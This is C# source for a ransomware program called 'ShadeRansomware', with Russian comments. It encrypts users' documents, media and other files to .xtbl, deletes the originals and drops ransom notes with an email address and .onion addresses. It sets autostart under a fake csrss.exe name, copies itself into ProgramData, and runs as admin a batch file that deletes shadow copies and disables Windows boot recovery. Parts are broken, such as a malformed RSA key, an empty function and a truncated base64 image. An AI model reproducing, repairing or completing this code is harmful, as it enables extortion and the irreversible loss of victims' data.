using System;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.Win32;
using System.Net;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using System.Diagnostics;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using System.Threading.Tasks;
using System.Linq;

namespace ShadeRansomware
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteFile(IntPtr hFile, [MarshalAs(UnmanagedType.LPArray)] byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        private static byte[] _aesKey;
        private static readonly string userDir = "C:\\Users\\";
        private static byte[] _aesIv;
        private static RSA _rsa;
        private static object _lock = new object();
        private static readonly string userName;

        public static string UserName => userName;

        static void Main(string[] args)
        {
            // Генерируем ключи AES
            _aesKey = new byte[32];
            _aesIv = new byte[16];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(_aesKey);
                rng.GetBytes(_aesIv);
            }

            // Загружаем открытый ключ RSA
            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(
                    @"<RSAKeyValue>
                      <Modulus>xJ6q0LYu91Pi9qAeIUF/3NskUgMESYobWh+Z4SMtC+NGKDmPkQ2saTFCNCxtJ5qYxDIUPzUcpVUDOqx1hL/eE4CYEQBHZbUQ30NnbfqmXDnOp2PEpLm4o9Qs6NNinfqngQ7+vs/DYJUCvZaUh5W4gaV0CswrHd3aOWjcmCBx27MKgDSlVjhKPUd/4YkL0i1nH8JBxDfThVZ7a9KJZX96ttrofl17TObhqyT5ScwXC426nbrlAEHXcJiI9CnBEHcynpIeSseQaJYT/W0o7BRej/eqc4ZNWbOQOgvathyguTrtjPyMMYQD7wo1OFJX8c5K2rbl8/Qd2c7KJQDGSE+AjQ==</Modulus><Exponent>AQAB</Modulus>
                      <Exponent>...</Exponent>
                    </RSAKeyValue>");
                _rsa = rsa;
            }

            // Создаем запись в реестре для автозапуска
           

            // Шифруем файлы
            string[] extensions = {
                ".1cd", ".3ds", ".3fr", ".3g2", ".3gp", ".7z", ".accda", ".accdb", ".accdc",
                ".accde", ".accdr", ".accdt", ".act", ".adb", ".adp", ".ads", ".adts", ".afm", ".agdl",
                ".ai", ".aif", ".aifc", ".aiff", ".ait", ".alz", ".amr", ".ani", ".apj", ".app",
                ".apr", ".arc", ".arj", ".art", ".asc", ".asf", ".asm", ".asp", ".ass", ".asti",
                ".asx", ".au", ".avi", ".awg", ".bak", ".baml", ".bash", ".bat", ".bdf", ".bdm",
                ".bdt", ".bem", ".bib", ".bik", ".bin", ".bkf", ".bkp", ".bld", ".blg", ".bmp",
                ".bpg", ".bpk", ".bpm", ".box", ".boz", ".bpa", ".bpc", ".bpd", ".bpe", ".bpg",
                ".bph", ".bpk", ".bpm", ".bpr", ".bpt", ".bpw", ".brk", ".brs", ".bsa", ".bsd",
                ".bsl", ".bss", ".bst", ".bsv", ".btm", ".bts", ".bup", ".bz2", ".c", ".cab",
                ".cac", ".caf", ".cam", ".car", ".cat", ".cbr", ".cbt", ".cbz", ".cc", ".ccad",
                ".ccc", ".txt", ".cch", ".cch", ".ccr", ".ccs", ".cct", ".ccw", ".cd", ".cd3",
                ".cdf", ".cdi", ".cdr", ".cdt", ".cdr", ".cer", ".cfg", ".cfm", ".cgm", ".cha",
                ".chm", ".chs", ".cht", ".cid", ".cin", ".cip", ".cir", ".ck", ".cls", ".clw",
                ".cmd", ".cml", ".cmp", ".cmx", ".cnk", ".cod", ".config", ".conf", ".con", ".cot",
                ".cpl", ".log", "...", "...", "...", "...", "..."
            };
            // продам меф б/у

            string[] directories = {
  Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Downloads",
    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments).TrimEnd('\\') + "\\Мои видеозаписи",
    
    // Исправлена папка "Мои видеозаписи"
    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos).TrimEnd('\\') + "\\Мои видеозаписи",

    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\OneDrive\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\3D Objects\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Links\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Saved Games\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\\Searches\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\\Favorites\",
    Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\\\Contacts\",
    Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
};

            foreach (var dir in directories)
            {
                if (!dir.EndsWith("\\Мои рисунки") && !dir.EndsWith("\\Моя музыка") && !dir.EndsWith("\\Мои видеозаписи"))
                {
                    EncryptFiles(dir, extensions);
                }
            }
            // Создаем README.txt с сообщением о выкупе
            CreateREADMEFiles();
           RenameShade();
            LookForDirectories();
           
            AddAutostartEntry();
            // Копируем себя в C:\ProgramData\Drivers
            CopySelf();
            
            Base6();
            // Устанавливаем соединение с удаленным сервером
           LookForDirectories();
            Bcdedit();
        }

        private static void Bcdedit()
        {
            // Текст для вставки в bat-файл
            string[] commands = new string[]
            {
        "vssadmin.exe Delete Shadows /All /Quiet",
        "bcdedit.exe /set {default} recoveryenabled No",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"
            };

            // Путь к bat-файлу
            string batFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "winscreen.bat");

            // Создание bat-файла
            CreateBatFile(batFilePath, commands);

            // Запуск bat-файла от имени администратора
            RunBatFileAsAdmin(batFilePath);
        }

        // Создание bat-файла с текстом
        static void CreateBatFile(string batFilePath, string[] commands)
        {
            // Создание файла
            using (StreamWriter writer = new StreamWriter(batFilePath))
            {
                // Запись команд в файл
                foreach (string command in commands)
                {
                    writer.WriteLine(command);
                }
            }
        }

        // Запуск bat-файла от имени администратора
        static void RunBatFileAsAdmin(string batFilePath)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.Verb = "runas";
            startInfo.FileName = batFilePath;
            startInfo.UseShellExecute = true;
            startInfo.CreateNoWindow = true;

            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }
    


        


        private static void EncryptFiles(string dir, string[] extensions)
        {
            foreach (var file in Directory.GetFiles(dir))
            {
                // Если файл не был уже зашифрован, шифруем его
                if (!file.EndsWith(".xtbl"))
                {
                    EncryptFile(file, extensions);
                }
            }

            // Рекурсивно шифруем вложенные каталоги
            foreach (var subdir in Directory.GetDirectories(dir))
            {
                EncryptFiles(subdir, extensions);
            }
        }

        private static void EncryptFile(string file, string[] extensions)
        {
            // Определяем, нужно ли шифровать этот файл
            bool encrypt = false;
            foreach (var extension in extensions)
            {
                if (file.EndsWith(extension))
                {
                    encrypt = true;
                    break;
                }
            }

            if (!encrypt)
            {
                return;
            }

            // Шифруем файл
            lock (_lock)
            {
                byte[] data = File.ReadAllBytes(file);
                AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.Key = _aesKey;
                aes.IV = _aesIv;
                ICryptoTransform encryptor = aes.CreateEncryptor();
                byte[] encryptedData = encryptor.TransformFinalBlock(data, 0, data.Length);

                // Сохраняем зашифрованный файл
                File.WriteAllBytes($"{file}.xtbl", encryptedData);

                // Удаляем исходный файл
                File.Delete(file);
            }
        }

        private static void CreateREADMEFiles()
        {
            for (int i = 1; i <= 10; i++)
            {
                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), $"README{i}.txt");
                File.WriteAllText(path, "Baши файлы были зaшифрoваны.\r\nЧmoбы pаcшuфроваmь иx, Bам необходимo оmправumь koд:\r\nBE704DA87649B31EFB45|0\r\nнa элеkтpoнный адрec robertamacdonald1994@gmail.com .\r\nДалеe вы пoлучиmе вcе нeoбхoдимыe инcтpуkцuu.\r\nПопытки раcшuфровaть самоcmоятельнo не пpивeдym ни k чeмy, крoмe безвозвpamной noтeри информaциu.\r\nEслu вы всё жe xoтите noпытаmьcя, mo nрeдвapительно cдeлайme peзервные konuu файлов, uнaче в случаe\r\nиx uзмeнeнuя рacшифpoвka сmанem нeвoзможной ни nри kаkиx yслoвиях.\r\nЕcлu вы не nолучuлu omвеmа no вышеуkазaннoмy aдpeсy в mеченuе 48 чacoв (и тoлько в этом cлучае!),\r\nвocnoльзуйтeсь фoрмой обpатной cвязu. Эmо мoжно cдeлaть двyмя сnосoбaмu:\r\n1) Cкачaйme u уcmaнoвиmе Tor Browser пo сcылке: https://www.torproject.org/download/download-easy.html.en\r\nВ aдрecнoй cтpoкe Tor Browser-a введuте адрec:\r\nhttp://cryptsen7fo43rr6.onion/\r\nи нажмиmе Enter. 3аrрузиmcя cmраницa с фоpмoй oбратной cвязu.\r\n2) B любом брaузере nepeйдuте пo oдномy uз адреcoв:\r\nhttp://cryptsen7fo43rr6.onion.to/\r\nhttp://cryptsen7fo43rr6.onion.cab/\r\n\r\n\r\nAll the important files on your computer were encrypted.\r\nTo decrypt the files you should send the following code:\r\nBE704DA87649B31EFB45|0\r\nto e-mail address robertamacdonald1994@gmail.com .\r\nThen you will receive all necessary instructions.\r\nAll the attempts of decryption by yourself will result only in irrevocable loss of your data.\r\nIf you still want to try to decrypt them by yourself please make a backup at first because\r\nthe decryption will become impossible in case of any changes inside the files.\r\nIf you did not receive the answer from the aforecited email for more than 48 hours (and only in this case!),\r\nuse the feedback form. You can do it by two ways:\r\n1) Download Tor Browser from here:\r\nhttps://www.torproject.org/download/download-easy.html.en\r\nInstall it and type the following address into the address bar:\r\nhttp://cryptsen7fo43rr6.onion/\r\nPress Enter and then the page with feedback form will be loaded.\r\n2) Go to the one of the following addresses in any browser:\r\nhttp://cryptsen7fo43rr6.onion.to/\r\nhttp://cryptsen7fo43rr6.onion.cab/");
            }
        }

        private static void CopySelf()
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), @"Drivers");
            Directory.CreateDirectory(path);
            File.Copy(Environment.GetCommandLineArgs()[0], Path.Combine(path, Path.GetFileName(Environment.GetCommandLineArgs()[0])));
        }
   







        private static void LookForDirectories()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            foreach (DriveInfo driveInfo in drives)
            {
                if (driveInfo.ToString() != "C:\\")
                {
                    EncryptDirectory(driveInfo.ToString());
                }
            }
            
            string location2 = userDir + UserName + "\\Links";
            string location3 = userDir + UserName + "\\Contacts";
            _ = userDir + userName + "\\Documents";
            string location6 = userDir + UserName + "\\Downloads";
            string location7 = userDir + UserName + "\\Pictures";
            string location8 = userDir + UserName + "\\Music";
            string location9 = userDir + UserName + "\\OneDrive";
            string location10 = userDir + UserName + "\\Saved Games";
            string location11 = userDir + UserName + "\\Favorites";
            string location12 = userDir + UserName + "\\Searches";
            string location13 = userDir + UserName + "\\Videos";
            
            EncryptDirectory(location2);
            EncryptDirectory(location3);
           
            
            EncryptDirectory(location6);
            EncryptDirectory(location7);
            EncryptDirectory(location8);
            EncryptDirectory(location9);
            EncryptDirectory(location10);
            EncryptDirectory(location11);
            EncryptDirectory(location12);
            EncryptDirectory(location13);
            
            
            
        }

        private static void EncryptDirectory(string v)
        {
            
        }
       




        





        private static void AddAutostartEntry()
    {
        string autostartPath = @"C:\ProgramData\Drivers\csrss.exe";

        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        {
                 string fileName = GenerateRandomFilename() + ".bmp";

                key.SetValue("Client Server Runtime Subsystem", autostartPath);
        }
        {
        }
        }






        

        public static void ManageWallpaper(string bmpUrl, string fileName)
        {
            string roamingAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Roaming\";
            string fullFilePath = Path.Combine(roamingAppDataPath, fileName);

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile(bmpUrl, fullFilePath);
                }

               

                File.Delete(fullFilePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"I cant realize that :( {ex.Message}");
            }
        }

        public static string GenerateRandomFilename()
        {
            Random random = new Random();
            const string chars = ".ABCDEFGHIJKLqwertyuiop[]asdfghjkl;'nm./zMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder name = new StringBuilder();

            for (int i = 0; i < 20; i++) // Generate 16 characters for the ID
            {
                name.Append(chars[random.Next(chars.Length)]);
            }

            return name.ToString();
        }

        public static void RenameShade()
        {
            // Список директорий для поиска файлов .xtbl
            string[] directories = new[]
               {
        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Downloads",
        Environment.GetFolderPath(Environment.SpecialFolder.MyVideos).TrimEnd('\\') + "\\Мои видеозаписи",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\OneDrive\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\3D Objects\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Links\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Saved Games\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Searches\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Favorites\",
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Contacts\",
        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
      };

            // Delay 5 seconds before starting
            Task.Delay(5000).Wait();

            // Rename files in each directory
            foreach (string directoryPath in directories)
            {
                try
                {
                    if (Directory.Exists(directoryPath))
                    {
                        string[] shadeFiles = Directory.GetFiles(directoryPath, "*.xtbl");

                        foreach (string shadeFile in shadeFiles)
                        {
                            // Check if the file is encrypted
                            if (IsFileEncrypted(shadeFile))
                            {
                                // Generate random ID
                                string randomId = GenerateRandomFilename2();

                                // Construct new file name
                                string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(shadeFile)
                              ; string base64FileName = Convert.ToBase64String(Encoding.ASCII.GetBytes(fileNameWithoutExtension));
                                string newFileName = $"{base64FileName}={randomId}.xtbl"; // Insert ID between Base64 and extension
                                string newFilePath = Path.Combine(directoryPath, newFileName);

                                // Move the encrypted file
                                File.Move(shadeFile, newFilePath);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Log the exception here if needed
                    Console.WriteLine($"Error renaming files in directory: {directoryPath} - {ex.Message}");
                }
            }

            Console.WriteLine("File renaming process completed.");
            Console.ReadKey();
        }

        // Function to generate a random filename
        static string GenerateRandomFilename2()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, 16)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        // Function to check if a file is encrypted
        static bool IsFileEncrypted(string filePath)
        {
            // You can use a simple check like checking for a specific header or footer 
            // in the file, or use a more robust method like analyzing the file content.
            // This is just a placeholder example.

            // For demonstration, let's assume any file with ".xtbl" extension is encrypted.
            return Path.GetExtension(filePath) == ".xtbl";
        }
    


[DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        private const int SPI_SETDESKWALLPAPER = 0x0014;
        private const int SPIF_UPDATEINIFILE = 0x01;
        private const int SPIF_SENDWININICHANGE = 0x02;

        static void Base6()
        {
            // Base64-encoded image string
            string base64Image = "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